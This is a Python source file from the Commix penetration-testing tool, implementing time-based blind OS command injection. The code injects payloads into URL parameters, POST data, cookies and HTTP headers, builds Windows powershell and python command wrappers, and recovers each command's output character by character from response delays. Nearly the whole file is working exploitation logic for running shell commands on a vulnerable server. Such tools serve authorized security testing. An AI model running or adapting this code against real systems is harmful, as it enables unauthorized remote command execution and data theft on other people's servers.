#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import json
import string
import random
import base64
from src.thirdparty.six.moves import urllib as _urllib
from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.core.injections.blind.techniques.time_based import tb_payloads

"""
 The "time-based" injection technique on Blind OS Command Injection.
"""

"""
Examine the GET/POST requests
"""
def examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response):

  start = 0
  end = 0
  start = time.time()

  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    # Encoding non-ASCII characters payload.
    # payload = _urllib.parse.quote(payload)   
    target = url.replace(settings.INJECT_TAG, payload)
    vuln_parameter = ''.join(vuln_parameter)
    request = _urllib.request.Request(target)

  # Check if defined method is POST.
  else :
    parameter = menu.options.data
    parameter = _urllib.parse.unquote(parameter)
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
    # Define the POST data  
    if settings.IS_JSON:
      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
      try:
        data = checks.json_data(data)
      except ValueError:
        pass
    elif settings.IS_XML:
      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
    else:
      data = parameter.replace(settings.INJECT_TAG, payload)
    request = _urllib.request.Request(url, data.encode(settings.UNICODE_ENCODING))

  # Check if defined extra headers.
  headers.do_check(request)
  # Get the response of the request
  response = requests.get_request_response(request)

  end  = time.time()
  how_long = int(end - start)

  return how_long

"""
Check if target host is vulnerable.
"""
def injection_test(payload, http_request_method, url):

  start = 0
  end = 0
  start = time.time()

  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    # Encoding non-ASCII characters payload.
    # payload = _urllib.parse.quote(payload)

    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    target = url.replace(settings.INJECT_TAG, payload)
    request = _urllib.request.Request(target)
              
  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = _urllib.parse.unquote(parameter)
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
    # Define the POST data     
    if settings.IS_JSON:
      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
      try:
        data = checks.json_data(data)
      except ValueError:
        pass
    elif settings.IS_XML:
      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
    else:
      data = parameter.replace(settings.INJECT_TAG, payload)
    request = _urllib.request.Request(url, data.encode(settings.UNICODE_ENCODING))
    
  # Check if defined extra headers.
  headers.do_check(request)
  # Get the response of the request
  response = requests.get_request_response(request)

  end  = time.time()
  how_long = int(end - start)
  return how_long, vuln_parameter

"""
Check if target host is vulnerable. (Cookie-based injection)
"""
def cookie_injection_test(url, vuln_parameter, payload):
  return requests.cookie_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (User-Agent-based injection)
"""
def user_agent_injection_test(url, vuln_parameter, payload):
  return requests.user_agent_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Referer-based injection)
"""
def referer_injection_test(url, vuln_parameter, payload):
  return requests.referer_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Host-based injection)
"""
def host_injection_test(url, vuln_parameter, payload):
  return requests.host_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Custom header injection)
"""
def custom_header_injection_test(url, vuln_parameter, payload):
  return requests.custom_header_injection(url, vuln_parameter, payload)

"""
The main command injection exploitation.
"""
def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  
  if settings.TARGET_OS == "win":
    previous_cmd = cmd
    if alter_shell:
      cmd = settings.WIN_PYTHON_DIR + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
    else: 
      cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"

  if menu.options.file_write or menu.options.file_upload:
    minlen = 0
  else:
    minlen = 1

  found_chars = False
  info_msg = "Retrieving the length of execution output. "
  sys.stdout.write(settings.print_info_msg(info_msg))
  sys.stdout.flush()  
  if settings.VERBOSITY_LEVEL >= 2:
    print("")
  for output_length in range(int(minlen), int(maxlen)):
    if alter_shell:
      # Execute shell commands on vulnerable host.
      payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
    else:
      # Execute shell commands on vulnerable host.
      payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method) 
    # Fix prefixes / suffixes
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)

    # Whitespace fixation
    payload = payload.replace(" ", whitespace)

    # Perform payload modification
    payload = checks.perform_payload_modification(payload)

    # Check if defined "--verbose" option.
    if settings.VERBOSITY_LEVEL == 1:
      payload_msg = payload.replace("\n", "\\n") 
      sys.stdout.write("\n" + settings.print_payload(payload_msg))
    # Check if defined "--verbose" option.
    elif settings.VERBOSITY_LEVEL >= 2:
      debug_msg = "Generating payload for the injection."
      print(settings.print_debug_msg(debug_msg))
      payload_msg = payload.replace("\n", "\\n") 
      sys.stdout.write(settings.print_payload(payload_msg) + "\n")

    # Check if defined cookie with "INJECT_HERE" tag
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
      how_long = cookie_injection_test(url, vuln_parameter, payload)

    # Check if defined user-agent with "INJECT_HERE" tag
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
      how_long = user_agent_injection_test(url, vuln_parameter, payload)

    # Check if defined referer with "INJECT_HERE" tag
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
      how_long = referer_injection_test(url, vuln_parameter, payload)

    # Check if defined host with "INJECT_HERE" tag
    elif menu.options.host and settings.INJECT_TAG in menu.options.host:
      how_long = host_injection_test(url, vuln_parameter, payload)

    # Check if defined custom header with "INJECT_HERE" tag
    elif settings.CUSTOM_HEADER_INJECTION:
      how_long = custom_header_injection_test(url, vuln_parameter, payload)

    else:  
      how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
    
    # Examine time-responses
    injection_check = False
    if (how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF):
      injection_check = True

    if injection_check == True:        
      if output_length > 1:
        if settings.VERBOSITY_LEVEL != 0:
          pass
        else:
          sys.stdout.write(settings.SUCCESS_STATUS + "\n")
          sys.stdout.flush()
        if settings.VERBOSITY_LEVEL == 1:
          print("")
        if settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Retrieved the length of execution output: " + str(output_length)
          print(settings.print_bold_debug_msg(debug_msg))
        else:
          sub_content = "Retrieved: " + str(output_length)
          print(settings.print_sub_content(sub_content))
      found_chars = True
      injection_check = False
      break

  # Proceed with the next (injection) step!
  if found_chars == True : 
    if settings.TARGET_OS == "win":
      cmd = previous_cmd
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    output = []
    percent = "0.0%"
    info_msg = "Presuming the execution output." 
    if menu.options.verbose < 1 :
      info_msg += ".. (" + str(percent) + ")"
    elif menu.options.verbose == 1 :
      info_msg +=  ""
    else:
      info_msg +=  "\n"  
    sys.stdout.write("\r" + settings.print_info_msg(info_msg))
    sys.stdout.flush()
    for num_of_chars in range(1, int(num_of_chars)):
      char_pool = checks.generate_char_pool(num_of_chars)
      for ascii_char in char_pool:
        if alter_shell:
          # Get the execution output, of shell execution.
          payload = tb_payloads.get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
        else:
          # Get the execution output, of shell execution.
          payload = tb_payloads.get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
        # Fix prefixes / suffixes
        payload = parameters.prefixes(payload, prefix)
        payload = parameters.suffixes(payload, suffix)

        # Whitespace fixation
        payload = payload.replace(" ", whitespace)
        
        # Perform payload modification
        payload = checks.perform_payload_modification(payload)

        # Check if defined "--verbose" option.
        if settings.VERBOSITY_LEVEL == 1:
          payload_msg = payload.replace("\n", "\\n") 
          sys.stdout.write("\n" + settings.print_payload(payload_msg))
        # Check if defined "--verbose" option.
        elif settings.VERBOSITY_LEVEL >= 2:
          debug_msg = "Generating payload for the injection."
          print(settings.print_debug_msg(debug_msg))
          payload_msg = payload.replace("\n", "\\n") 
          sys.stdout.write(settings.print_payload(payload_msg) + "\n")

        # Check if defined cookie with "INJECT_HERE" tag
        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
          how_long = cookie_injection_test(url, vuln_parameter, payload)

        # Check if defined user-agent with "INJECT_HERE" tag
        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
          how_long = user_agent_injection_test(url, vuln_parameter, payload)

        # Check if defined referer with "INJECT_HERE" tag
        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
          how_long = referer_injection_test(url, vuln_parameter, payload)

        # Check if defined host with "INJECT_HERE" tag
        elif menu.options.host and settings.INJECT_TAG in menu.options.host:
          how_long = host_injection_test(url, vuln_parameter, payload)

        # Check if defined custom header with "INJECT_HERE" tag
        elif settings.CUSTOM_HEADER_INJECTION:
          how_long = custom_header_injection_test(url, vuln_parameter, payload)
          
        else:    
          how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
        
        # Examine time-responses
        injection_check = False
        if (how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF):
          injection_check = True
          
        if injection_check == True:
          if settings.VERBOSITY_LEVEL == 0:
            output.append(chr(ascii_char))
            percent = ((num_of_chars*100)/output_length)
            float_percent = str("{0:.1f}".format(round(((num_of_chars * 100)/(output_length * 1.0)),2))) + "%"
            if percent == 100:
              float_percent = settings.info_msg
            else:
              float_percent = ".. (" + str(float_percent) + ")"
            info_msg = "Presuming the execution output."
            info_msg += float_percent
            sys.stdout.write("\r" + settings.print_info_msg(info_msg))
            sys.stdout.flush()
          else:
            output.append(chr(ascii_char))
          injection_check = False  
          break
    
    check_end  = time.time()
    check_how_long = int(check_end - check_start)
    output = "".join(str(p) for p in output)
    
    # Check for empty output.
    if output == (len(output) * " "):
      output = ""

  else:
    check_start = 0
    if settings.VERBOSITY_LEVEL == 0:
      sys.stdout.write(settings.FAIL_STATUS)
      sys.stdout.flush()
    else:
      pass

    check_how_long = 0
    output = False

  if settings.VERBOSITY_LEVEL != 0 and menu.options.ignore_session:
    print("")
  return  check_how_long, output

"""
False Positive check and evaluation.
"""
def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response):

  if settings.TARGET_OS == "win":
    previous_cmd = cmd
    if alter_shell:
      cmd = settings.WIN_PYTHON_DIR + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
    else: 
      cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"

  found_chars = False
  debug_msg = "Checking the reliability of the used payload "
  debug_msg += "in case of a false positive result. "
  if settings.VERBOSITY_LEVEL != 0: 
    sys.stdout.write(settings.print_debug_msg(debug_msg))
    sys.stdout.flush()

  # Varying the sleep time.
  timesec = timesec + random.randint(1, 5)

  # Checking the output length of the used payload.
  for output_length in range(1, 3):
    # Execute shell commands on vulnerable host.
    if alter_shell:
      payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
    else:
      payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
    
    # Fix prefixes / suffixes
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)

    # Whitespace fixation
    payload = payload.replace(" ", whitespace)

    # Perform payload modification
    payload = checks.perform_payload_modification(payload)

    # Check if defined "--verbose" option.
    if settings.VERBOSITY_LEVEL == 1:
      payload_msg = payload.replace("\n", "\\n") 
      sys.stdout.write("\n" + settings.print_payload(payload_msg))
    # Check if defined "--verbose" option.
    elif settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Generating payload for testing the reliability of used payload."
      print("\n" + settings.print_debug_msg(debug_msg))
      payload_msg = payload.replace("\n", "\\n") 
      sys.stdout.write(settings.print_payload(payload_msg) + "\n")

    # Check if defined cookie with "INJECT_HERE" tag
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
      how_long = cookie_injection_test(url, vuln_parameter, payload)

    # Check if defined user-agent with "INJECT_HERE" tag
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
      how_long = user_agent_injection_test(url, vuln_parameter, payload)

    # Check if defined referer with "INJECT_HERE" tag
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
      how_long = referer_injection_test(url, vuln_parameter, payload)

    # Check if defined host with "INJECT_HERE" tag
    elif menu.options.host and settings.INJECT_TAG in menu.options.host:
      how_long = host_injection_test(url, vuln_parameter, payload)

    # Check if defined custom header with "INJECT_HERE" tag
    elif settings.CUSTOM_HEADER_INJECTION:
      how_long = custom_header_injection_test(url, vuln_parameter, payload)

    else:  
      how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)

    if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
      found_chars = True
      break

  if found_chars == True :
    if settings.TARGET_OS == "win":
      cmd = previous_cmd
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    
    output = []
    percent = 0
    sys.stdout.flush()

    is_valid = False
    for num_of_chars in range(1, int(num_of_chars)):
      for ascii_char in range(1, 20):

        if alter_shell:
          # Get the execution output, of shell execution.
          payload = tb_payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
        else:
          # Get the execution output, of shell execution.
          payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
          
        # Fix prefixes / suffixes
        payload = parameters.prefixes(payload, prefix)
        payload = parameters.suffixes(payload, suffix)

        # Whitespace fixation
        payload = payload.replace(" ", whitespace)

        # Perform payload modification
        payload = checks.perform_payload_modification(payload)

        # Check if defined "--verbose" option.
        if settings.VERBOSITY_LEVEL == 1:
          payload_msg = payload.replace("\n", "\\n") 
          sys.stdout.write("\n" + settings.print_payload(payload_msg))
        # Check if defined "--verbose" option.
        elif settings.VERBOSITY_LEVEL >= 2:
          debug_msg = "Generating payload for testing the reliability of used payload."
          print(settings.print_debug_msg(debug_msg))
          payload_msg = payload.replace("\n", "\\n") 
          sys.stdout.write(settings.print_payload(payload_msg) + "\n")

        # Check if defined cookie with "INJECT_HERE" tag
        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
          how_long = cookie_injection_test(url, vuln_parameter, payload)

        # Check if defined user-agent with "INJECT_HERE" tag
        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
          how_long = user_agent_injection_test(url, vuln_parameter, payload)

        # Check if defined referer with "INJECT_HERE" tag
        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
          how_long = referer_injection_test(url, vuln_parameter, payload)

        # Check if defined host with "INJECT_HERE" tag
        elif menu.options.host and settings.INJECT_TAG in menu.options.host:
          how_long = host_injection_test(url, vuln_parameter, payload)

        # Check if defined custom header with "INJECT_HERE" tag
        elif settings.CUSTOM_HEADER_INJECTION:
          how_long = custom_header_injection_test(url, vuln_parameter, payload)

        else:    
          how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)

        if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
          output.append(ascii_char)
          is_valid = True
          break
          
      if is_valid:
          break

    check_end  = time.time()
    check_how_long = int(check_end - check_start)
    output = "".join(str(p) for p in output)

    if str(output) == str(randvcalc):
      if settings.VERBOSITY_LEVEL == 1:
        print("")
      return how_long, output
  else:
    if settings.VERBOSITY_LEVEL < 2:
      print("")
    warn_msg = "False positive or unexploitable injection point detected."
    print(settings.print_warning_msg(warn_msg))
        

"""
Export the injection results
"""
def export_injection_results(cmd, separator, output, check_how_long):

  if output != "" and check_how_long != 0 :
    if settings.VERBOSITY_LEVEL == 0:
      print("\n")
    elif settings.VERBOSITY_LEVEL == 1:
      print("")  
    print(settings.print_output(output))
    info_msg = "Finished in " + time.strftime('%H:%M:%S', time.gmtime(check_how_long)) + "."
    sys.stdout.write("\n" + settings.print_info_msg(info_msg))
  else:
    # Check if exists pipe filtration.
    if output != False :
      err_msg = "It appears that '" + cmd + "' command could not return " 
      err_msg += "any output due to '" + separator + "' filtration on target host. "
      err_msg += "To bypass that limitation, use the '--alter-shell' option "
      err_msg += "or try another injection technique (i.e. '--technique=\"f\"')"
      print("\n" + settings.print_critical_msg(err_msg))
      raise SystemExit()
    # Check for fault command.
    else:
      err_msg = "The '" + cmd + "' command, does not return any output."
      if settings.VERBOSITY_LEVEL == 0:
        print("")
      sys.stdout.write("\r" + settings.print_critical_msg(err_msg))
# eof